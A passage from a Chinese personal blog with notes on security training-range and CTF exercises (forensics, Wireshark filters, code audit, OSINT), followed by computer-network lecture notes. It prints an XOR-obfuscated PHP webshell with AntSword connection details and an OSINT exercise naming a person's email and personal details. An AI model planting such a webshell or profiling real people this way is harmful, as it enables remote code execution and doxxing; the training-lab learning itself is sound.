<h3 id="来源页伪造"><a href="#来源页伪造" class="headerlink" title="来源页伪造"></a>来源页伪造</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">来源页 === 报文referer</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="主机安全"><a href="#主机安全" class="headerlink" title="主机安全"></a>主机安全</h1><h3 id="用户终端环境识别"><a href="#用户终端环境识别" class="headerlink" title="用户终端环境识别"></a>用户终端环境识别</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">抓包改</span><br><span class="line">useragent改成ipad</span><br><span class="line">accept-language:en,zh;q=0.9,zh-CN;q=0.8,en-GB;q=0.7,en-US;q=0.6，这里q是优先级</span><br><span class="line">cookie:分辨率在这里</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="WEB站点访问者身份识别"><a href="#WEB站点访问者身份识别" class="headerlink" title="WEB站点访问者身份识别"></a>WEB站点访问者身份识别</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ip/robots.txt（注意有s）得知什么搜索引擎能用，然后去搜一个UA换一下</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="电子数据取证"><a href="#电子数据取证" class="headerlink" title="电子数据取证"></a>电子数据取证</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">关于linux日志文件的分析</span><br><span class="line">参考https://baijiahao.baidu.com/s?id=1722295394270641817&amp;wfr=spider&amp;for=pc</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Linux硬盘文件分析取证-SSH过的IP"><a href="#Linux硬盘文件分析取证-SSH过的IP" class="headerlink" title="Linux硬盘文件分析取证(SSH过的IP)"></a>Linux硬盘文件分析取证(SSH过的IP)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//实训目标</span><br><span class="line">1、了解Linux备份方式；</span><br><span class="line">2、了解AccessData FTK Imager使用方法；</span><br><span class="line">3、掌握如何查看Linux日志；</span><br><span class="line"></span><br><span class="line">备份用dd工具</span><br><span class="line">参考https://blog.csdn.net/L592181260/article/details/110110771</span><br><span class="line">AccessData FTK Imager使用方法</span><br><span class="line">File-&gt;ADD Evidence Item-&gt;Image File导入img镜像</span><br><span class="line">Linux日志保存在/etc/log/messages</span><br><span class="line">检索sshd</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/1654616455109.png" alt="1654616455109"></p>
<h3 id="Linux硬盘文件分析取证-新增用户"><a href="#Linux硬盘文件分析取证-新增用户" class="headerlink" title="Linux硬盘文件分析取证(新增用户)"></a>Linux硬盘文件分析取证(新增用户)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AccessData FTK Imager加载镜像打开/etc/password最下面就是了，或者查看/var/log/messages检索password for</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/1654662366214.png" alt="1654662366214"></p>
<h3 id="日志文件分析溯源-Google蜘蛛"><a href="#日志文件分析溯源-Google蜘蛛" class="headerlink" title="日志文件分析溯源(Google蜘蛛)"></a>日志文件分析溯源(Google蜘蛛)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">检索googlebot，最前面是ip</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="远程电子数据取证-服务器分析-第1题"><a href="#远程电子数据取证-服务器分析-第1题" class="headerlink" title="远程电子数据取证-服务器分析(第1题)"></a>远程电子数据取证-服务器分析(第1题)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">win+R 	mstsc远程连接	这里要加上端口号</span><br><span class="line">在c盘搜索recycler即可</span><br><span class="line">关于recycler：实际被删除的文件保存在各自磁盘的recycler文件夹中，显示在回收站中</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="网络数据分析溯源-3389登录的IP地址"><a href="#网络数据分析溯源-3389登录的IP地址" class="headerlink" title="网络数据分析溯源(3389登录的IP地址)"></a>网络数据分析溯源(3389登录的IP地址)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">使用wireshark打开文件</span><br><span class="line">tcp.dstport==3389</span><br><span class="line">wireshark过滤命令参考https://blog.csdn.net/a56546/article/details/122208788?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_title~default-0-122208788-blog-79342051.pc_relevant_antiscanv2&amp;spm=1001.2101.3001.4242.1&amp;utm_relevant_index=2</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Docx文件分析溯源"><a href="#Docx文件分析溯源" class="headerlink" title="Docx文件分析溯源"></a>Docx文件分析溯源</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">使用Advanced Office Password Recovery爆破密码</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Windows硬盘文件分析取证-连接过的FTP地址"><a href="#Windows硬盘文件分析取证-连接过的FTP地址" class="headerlink" title="Windows硬盘文件分析取证(连接过的FTP地址)"></a>Windows硬盘文件分析取证(连接过的FTP地址)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">参考https://blog.csdn.net/LRedAnt/article/details/103783239</span><br><span class="line">#挂载磁盘</span><br><span class="line">AccessData FTK Imager-&gt;file-&gt;image mounting-&gt;选择挂载文件，Mounting Method选择File System/Read Only		这一步挂载俺就成了一次lihua文件加一直没有访问权限</span><br><span class="line">新磁盘E盘搜素history，index.dat,检索ftp://得到ip</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="网络数据分析溯源-连接login-php的IP"><a href="#网络数据分析溯源-连接login-php的IP" class="headerlink" title="网络数据分析溯源(连接login.php的IP)"></a>网络数据分析溯源(连接login.php的IP)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wireshark打开</span><br><span class="line">过滤语句:		http contains &quot;login.php&quot;		这里是双引号！！</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="网络数据分析溯源-ping服务器的IP地址"><a href="#网络数据分析溯源-ping服务器的IP地址" class="headerlink" title="网络数据分析溯源(ping服务器的IP地址)"></a>网络数据分析溯源(ping服务器的IP地址)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ping指令使用icmp协议</span><br><span class="line">过滤语句：	icmp</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1><h3 id="PHP代码分析溯源-第1题"><a href="#PHP代码分析溯源-第1题" class="headerlink" title="PHP代码分析溯源(第1题)"></a>PHP代码分析溯源(第1题)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//	注：后缀php文件要在打开服务器后从浏览器看效果</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//	@在PHP中用作错误控制操作符。当表达式附加@符号时，将忽略该表达式可能生成的错误消息,如果启用了track_errors功能，则表达式生成的错误消息将保存在变量$php_errormsg中。每个错误都会覆盖此变量。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 	一句话后门中eval和assert的区别，参考https://blog.csdn.net/whatday/article/details/59168605</span></span><br><span class="line"><span class="comment">// 	eval参数是字符，assert参数是表达式或者函数</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	@<span class="variable">$_</span>++;</span><br><span class="line">	<span class="variable">$__</span>=(<span class="string">&quot;`&quot;</span>^<span class="string">&quot;?&quot;</span>).(<span class="string">&quot;:&quot;</span>^<span class="string">&quot;&#125;&quot;</span>).(<span class="string">&quot;%&quot;</span>^<span class="string">&quot;`&quot;</span>).(<span class="string">&quot;&#123;&quot;</span>^<span class="string">&quot;/&quot;</span>);</span><br><span class="line">	<span class="variable">$___</span>=(<span class="string">&quot;$&quot;</span>^<span class="string">&quot;&#123;&quot;</span>).(<span class="string">&quot;~&quot;</span>^<span class="string">&quot;.&quot;</span>).(<span class="string">&quot;/&quot;</span>^<span class="string">&quot;`&quot;</span>).(<span class="string">&quot;-&quot;</span>^<span class="string">&quot;~&quot;</span>).(<span class="string">&quot;(&quot;</span>^<span class="string">&quot;|&quot;</span>);</span><br><span class="line">	<span class="comment">// $&#123;$__&#125;[!$_]($&#123;$___&#125;[$_]); 	</span></span><br><span class="line">	<span class="comment">//$&#123;_GET&#125;[0]($&#123;_POST&#125;[1]);</span></span><br><span class="line">	<span class="comment">//$_GET[0]($_POST[1]);			本条为执行代码，不能打印？</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	(&quot;`&quot;^&quot;?&quot;)       	01100000^00111111=01011111—&gt;”_”</span></span><br><span class="line"><span class="comment">	(&quot;:&quot;^&quot;&#125;&quot;)        	00111010^01111101=01000111—&gt;”G”</span></span><br><span class="line"><span class="comment">	(&quot;%&quot;^&quot;`&quot;)      		00100101^01100000=01000101—&gt;”E”</span></span><br><span class="line"><span class="comment">	(&quot;&#123;&quot;^&quot;/&quot;)        	01111011^00101111=01010100—&gt;”T”</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$_</span>;			<span class="comment">#1       数值类型</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$__</span>;			<span class="comment">#_GET    字符类型</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$___</span>;			<span class="comment">#_POST   字符类型</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//	中国蚁剑连接	http://ip/b.php?0=assert 密码是1</span></span><br><span class="line"><span class="comment">//	!!!剑编码方式不能选默认</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="小学生加解密练习"><a href="#小学生加解密练习" class="headerlink" title="小学生加解密练习"></a>小学生加解密练习</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">too simple</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="密码学加解密实训-摩斯密码第1题"><a href="#密码学加解密实训-摩斯密码第1题" class="headerlink" title="密码学加解密实训(摩斯密码第1题)"></a>密码学加解密实训(摩斯密码第1题)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">使用winhex打开密文</span><br><span class="line">关于winhex这是一个可以用于磁盘回复的软件</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/1654764056637.png" alt="1654764056637"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">发现它是wav文件，改后缀.wav</span><br><span class="line">后续参考https://blog.csdn.net/weixin_50698958/article/details/109060111</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="PHP代码分析溯源-第2题"><a href="#PHP代码分析溯源-第2题" class="headerlink" title="PHP代码分析溯源(第2题)"></a>PHP代码分析溯源(第2题)</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">参考https:<span class="operator">/</span><span class="operator">/</span>blog.csdn.net<span class="operator">/</span>weixin_39998158<span class="operator">/</span>article<span class="operator">/</span>details<span class="operator">/</span><span class="number">100547071</span></span><br><span class="line">因为php是弱类型语言，在使用<span class="operator">=</span><span class="operator">=</span>号时，如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换为数值并且比较按照数值来进行</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/1654876263894.png" alt="1654876263894"></p>
<h3 id="php分析溯源"><a href="#php分析溯源" class="headerlink" title="php分析溯源"></a>php分析溯源</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">too simple</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="安全意识"><a href="#安全意识" class="headerlink" title="安全意识"></a>安全意识</h1><h3 id="WEB页面分析"><a href="#WEB页面分析" class="headerlink" title="WEB页面分析"></a>WEB页面分析</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查看源代码发现一个注释的a标签，猜一个url，这里是猜什么都行的</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="二维码文件分析"><a href="#二维码文件分析" class="headerlink" title="二维码文件分析"></a>二维码文件分析</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">将靶场二维码下载到本地，找一个二维码在线解码，可以用https://cli.im/deqr，上传本地二维码进行解码，扫二维码后会得到一个链接，将链接https://www.baidu.com/ss?wd= 后面的内容通过base64两次解码，就会得到验证码，验证通过获取flag</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="互联网足迹探查"><a href="#互联网足迹探查" class="headerlink" title="互联网足迹探查"></a>互联网足迹探查</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">参考https://zhuanlan.zhihu.com/p/148433705</span><br><span class="line">添加好友得到有效信息:</span><br><span class="line">昵称WYH023S，男，35，1月19，重庆合川，邮箱1225307208@qq.com</span><br><span class="line">使用qq号和邮箱探查在哪些平台有活动痕迹</span><br><span class="line">利用搜索引擎探索有效信息，然后在微博上发现此人</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="PHP逻辑漏洞利用实战-第1题"><a href="#PHP逻辑漏洞利用实战-第1题" class="headerlink" title="PHP逻辑漏洞利用实战(第1题)"></a>PHP逻辑漏洞利用实战(第1题)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">感觉被骗了。。哪有这么出题的</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="CTFHUB"><a href="#CTFHUB" class="headerlink" title="CTFHUB"></a>CTFHUB</h1><h3 id="afr-2"><a href="#afr-2" class="headerlink" title="afr-2"></a>afr-2</h3><p><img src="/2023/07/05/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/1678113309924.png" alt="1678113309924"></p>
<h3 id="BUUCTF–-NESTCTF-2019-Love-Math-2"><a href="#BUUCTF–-NESTCTF-2019-Love-Math-2" class="headerlink" title="BUUCTF–[NESTCTF 2019]Love Math 2"></a>BUUCTF–[NESTCTF 2019]Love Math 2</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/qq_46263951/article/details/119240395</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="vulhubdocker"><a href="#vulhubdocker" class="headerlink" title="vulhub	docker"></a>vulhub	docker</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">weblogic 未授权命令执行漏洞		CVE-2020-14882</span><br><span class="line">weblogic ssrf				CVE</span><br><span class="line">https://blog.csdn.net/weixin_48739941/article/details/124330906</span><br><span class="line"></span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://huyaoyao2019.github.io/2023/07/05/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/" data-id="cljpvmu860002pwez1eou04h5" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-计算机网络" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/07/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" class="article-date">
  <time class="dt-published" datetime="2023-07-05T15:30:27.551Z" itemprop="datePublished">2023-07-05</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h3 id="002讲-网络-互联网-英特网"><a href="#002讲-网络-互联网-英特网" class="headerlink" title="002讲 网络 互联网 英特网"></a>002讲 网络 互联网 英特网</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">网络由若干结点Node和链接这些结点的链路link组成</span><br><span class="line">多个网络可通过路由器互连起来，这样就构成了一个覆盖范围更大的网络，即互联网，因此，互联网是‘网络的网络’</span><br><span class="line">因特网是世界最大的互联网</span><br><span class="line">internet 和 Internet区别</span><br><span class="line">internet通用名词，泛指由多个计算机互连而成的网络。这些网络之间的通信协议可以是任意的。</span><br><span class="line">Internet则是个专用名词，指当前全球最大的、开放的由众多网络互连而成的特定计算机网络，它由TCP/IP协议族作为通信规则，其前身是美国的ARPANET</span><br><span class="line">ISP英特网服务提供者（Internet Service Provider）</span><br><span class="line">我国的ISP三个运营商</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20220817143559646.png" alt="image-20220817143559646"></p>
<h3 id="003讲-电路交换-报文交换-分组交换"><a href="#003讲-电路交换-报文交换-分组交换" class="headerlink" title="003讲 电路交换 报文交换 分组交换"></a>003讲 电路交换 报文交换 分组交换</h3><h3 id><a href="#" class="headerlink" title></a><img src="/2023/07/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20220817151508922.png" alt="image-20220817151508922"></h3><h3 id="004讲-计算机网络的定义和分类"><a href="#004讲-计算机网络的定义和分类" class="headerlink" title="004讲 计算机网络的定义和分类"></a>004讲 计算机网络的定义和分类</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">最简单的定义：一些互相连接的、自治的计算机的集合</span><br><span class="line">较好定义：计算机网络主要由一些通用的、可编程的硬件互连而成，而这些硬件并非专门用来实现某一特定目的（例如，传送数据或视频信号）。这些可编程硬件能够用来传送多种不同类型的数据，并能支持广泛的和日益增长的应用。</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20220817152523637.png" alt="image-20220817152523637"></p>
<h3 id="007讲-计算机网络体系结构-上"><a href="#007讲-计算机网络体系结构-上" class="headerlink" title="007讲 计算机网络体系结构 上"></a>007讲 计算机网络体系结构 上</h3><p><img src="/2023/07/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20220819000155195.png" alt="image-20220819000155195"></p>
<p><img src="/2023/07/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20220819000309569.png" alt="image-20220819000309569"></p>
<h3 id="008讲-下"><a href="#008讲-下" class="headerlink" title="008讲 下"></a>008讲 下</h3><p><img src="/2023/07/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20220819000340520.png" alt="image-20220819000340520"></p>
<p><img src="/2023/07/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20220819001727359.png" alt="image-20220819001727359"></p>
<p><img src="/2023/07/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20220819001933451.png" alt="image-20220819001933451"></p>
<p><img src="/2023/07/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/typora_files" alt="image-20220819002036681"></p>
<p><img src="/2023/07/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/typora_files" alt="image-20220819002145778"></p>
<h3 id="009讲-计算机网络体系结构-分层思想举例"><a href="#009讲-计算机网络体系结构-分层思想举例" class="headerlink" title="009讲 计算机网络体系结构 分层思想举例"></a>009讲 计算机网络体系结构 分层思想举例</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.bilibili.com/video/BV1Y4411U71L?spm_id_from=333.999.0.0&amp;vd_source=d5448e640adeda715972607248810967</span><br></pre></td></tr></table></figure>

<h3 id="012讲-习题"><a href="#012讲-习题" class="headerlink" title="012讲 习题"></a>012讲 习题</h3><p><img src="/2023/07/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20220819154537989.png" alt="image-20220819154537989"></p>
<h3 id="028讲-点对点协议"><a href="#028讲-点对点协议" class="headerlink" title="028讲 点对点协议"></a>028讲 点对点协议</h3><p><img src="/2023/07/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20220820192706458.png" alt="image-20220820192706458"></p>
<p><img src="/2023/07/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20220820192606493.png" alt="image-20220820192606493"></p>
<h3 id="033讲-MAC地址"><a href="#033讲-MAC地址" class="headerlink" title="033讲 MAC地址"></a>033讲 MAC地址</h3><p><img src="/2023/07/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20220820200237389.png" alt="image-20220820200237389"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MAC地址有时也被称为物理地址。请注意这并不意味MAC地址属于网络体系中的物理层</span><br><span class="line">一般情况下，用户主语会包含两个网络适配器：有限局域网适配器（有线网卡）和无线局域网适配器（无线网卡）。每个网络适配器都会有一个全球唯一的MAC地址。而交换机和路由器往往拥有更多的网络接口，所以会拥有更多的MAC地址。</span><br><span class="line">综上，严格来说，MAC地址是对网络上个接口的唯一标识，而不是对网络上各设备的唯一标识。</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20220820200852377.png" alt="image-20220820200852377"></p>
<p><img src="/2023/07/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20220820201125472.png" alt="image-20220820201125472"></p>
<h3 id="034讲-IP地址"><a href="#034讲-IP地址" class="headerlink" title="034讲 IP地址"></a>034讲 IP地址</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">IP地址是因特网上主机和路由器所使用的地址，用于标识两部分信息</span><br><span class="line">网络编号：标识因特网上数以万记的网络</span><br><span class="line">主机编号：标识网络上不同主机或路由器各接口</span><br></pre></td></tr></table></figure>

<h3 id="035讲-ARP协议"><a href="#035讲-ARP协议" class="headerlink" title="035讲 ARP协议"></a>035讲 ARP协议</h3><p><img src="/2023/07/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20220820222216312.png" alt="image-20220820222216312"></p>
<h3 id="036讲-集线器与交换机的区别"><a href="#036讲-集线器与交换机的区别" class="headerlink" title="036讲 集线器与交换机的区别"></a>036讲 集线器与交换机的区别</h3><p><img src="/2023/07/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20220820222512235.png" alt="image-20220820222512235"></p>
<h3 id="044讲-IPv4地址"><a href="#044讲-IPv4地址" class="headerlink" title="044讲 IPv4地址"></a>044讲 IPv4地址</h3><p><img src="/2023/07/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20220821143941202.png" alt="image-20220821143941202"></p>
<p><img src="/2023/07/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20220821144306592.png" alt="image-20220821144306592"></p>
<p><img src="/2023/07/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20220821144507063.png" alt="image-20220821144507063"></p>
<p><img src="/2023/07/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20220821162039904.png" alt="image-20220821162039904"></p>
<p><img src="/2023/07/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20220821162229588.png" alt="image-20220821162229588"></p>
<h3 id="045讲-划分子网得ipv4地址"><a href="#045讲-划分子网得ipv4地址" class="headerlink" title="045讲 划分子网得ipv4地址"></a>045讲 划分子网得ipv4地址</h3><p><img src="/2023/07/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20220821164202223.png" alt="image-20220821164202223"></p>
<p><img src="/2023/07/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20220821164938993.png" alt="image-20220821164938993"></p>
<h3 id="046讲-无分类编址的ipv4地址"><a href="#046讲-无分类编址的ipv4地址" class="headerlink" title="046讲 无分类编址的ipv4地址"></a>046讲 无分类编址的ipv4地址</h3><p><img src="/2023/07/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20220821170054770.png" alt="image-20220821170054770"></p>
<h3 id="047讲-ipv4地址应用规划"><a href="#047讲-ipv4地址应用规划" class="headerlink" title="047讲 ipv4地址应用规划"></a>047讲 ipv4地址应用规划</h3><p><img src="/2023/07/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20220821180614102.png" alt="image-20220821180614102"></p>
<h3 id="049讲-静态路由配置及可能产生的路由环路问题"><a href="#049讲-静态路由配置及可能产生的路由环路问题" class="headerlink" title="049讲 静态路由配置及可能产生的路由环路问题"></a>049讲 静态路由配置及可能产生的路由环路问题</h3><p><img src="/2023/07/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20220821212038824.png" alt="image-20220821212038824"></p>
<h3 id="051讲-路由信息协议RIP的基本工作原理"><a href="#051讲-路由信息协议RIP的基本工作原理" class="headerlink" title="051讲 路由信息协议RIP的基本工作原理"></a>051讲 路由信息协议RIP的基本工作原理</h3><p><img src="/2023/07/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20220824172516310.png" alt="image-20220824172516310"></p>
<p><img src="/2023/07/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20220824172409433.png" alt="image-20220824172409433"></p>
